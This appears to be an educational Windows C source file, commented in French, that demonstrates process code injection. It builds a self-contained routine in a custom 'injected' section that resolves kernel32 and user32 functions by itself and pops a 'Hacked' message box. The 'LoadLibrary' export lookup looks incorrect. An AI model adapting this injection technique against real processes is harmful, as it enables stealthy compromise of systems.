/*
 * Ce programme illustre un exemple d'injection de code dans un processus en utilisant des segments de données et de code spécifiques.
 * Il charge la bibliothèque KERNEL32.DLL, puis utilise la fonction MessageBoxA de USER32.DLL pour afficher une boîte de dialogue.
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "libproc.h"

//HMODULE = Handle Module (dll ou exe)
//LPCSTR = Long Pointer to a Constant STRing => alias de const char*
//loadlib_call devient un type qui represente un ptr vers une fonction qui prends un LPCSTR et retourne un HMODULE
typedef HMODULE(*loadlib_call)(LPCSTR);


typedef int (*msgbox_call)(
    HWND   hWnd,//Handle vers une Window
    LPCSTR lpText,//const char* vers le texte de la boite de dialogue
    LPCSTR lpCaption,// -- vers le titre de la --
    UINT   uType// rp le type de la boite de dialogue
    );

//alloue et nomme un segment de données "injected", puis place la chaine kernel32_str dans cette section
__declspec(allocate("injected"))
short kernel32_str[] = L"C:\\WINDOWS\\System32\\KERNEL32.DLL";

__declspec(allocate("injected"))
char loadlibrary_str[] = "LoadLibrary";

__declspec(allocate("injected"))
char user32_str[] = "user32.dll";

__declspec(allocate("injected"))
char msgbox_str[] = "MessageBoxA";

__declspec(allocate("injected"))
char msgbox_body_str[] = "Hacked";

__declspec(allocate("injected"))
char msgbox_caption_str[] = "HackBox";

//place la fonction dans la section "injected"
__declspec(code_seg("injected"))
void inj_code_c()
{   
    //PVOID a.k.a. void* définit avec "typedef void* PVOID" dans la doc windows
    //ptr vers 
    PVOID dll = get_dll(kernel32_str);
    LOG("KERNEL32 at %p\n", dll);
    //list_func(dll);
    PVOID loadlib = get_func(loadlibrary_str, dll);
    LOG("loadlib at %p\n", loadlib);
    HMODULE hM = ((loadlib_call)loadlib)(user32_str);
    LOG("hmod at %p\n", hM);
    LOG("what %s\n", (PCHAR)hM);
    PVOID msgbox = get_func(msgbox_str, hM);
    LOG("msgbox at %p\n", msgbox);
    ((msgbox_call)msgbox)(NULL, msgbox_body_str, msgbox_caption_str, 0);

}